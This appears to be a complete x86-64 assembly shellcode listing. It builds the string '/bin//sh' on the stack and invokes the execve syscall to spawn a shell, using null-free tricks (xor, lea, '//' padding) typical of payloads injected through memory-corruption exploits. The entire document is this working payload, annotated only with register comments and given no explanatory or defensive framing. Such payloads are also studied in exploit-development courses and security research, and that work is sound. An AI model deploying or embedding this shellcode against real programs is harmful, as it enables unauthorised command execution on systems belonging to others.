	global _start

	section .text
_start:
	xor	rdx,rdx          	; rdx=NULL
	push 	rdx			; push NULL
	mov     rax,0x68732f2f6e69622f	; rax='/bin//sh'
	push  	rax			; push '/bin//sh'
	mov     rdi,rsp			; rdi='/bin//sh\0'
	push	rdx			; push NULL
	push	rdi			; push '/bin//sh\0'
	mov	rsi,rsp			; rsi=['/bin//sh', NULL]
	lea	rax,[rdx+59]		; rax=59 execve syscall no.
	syscall
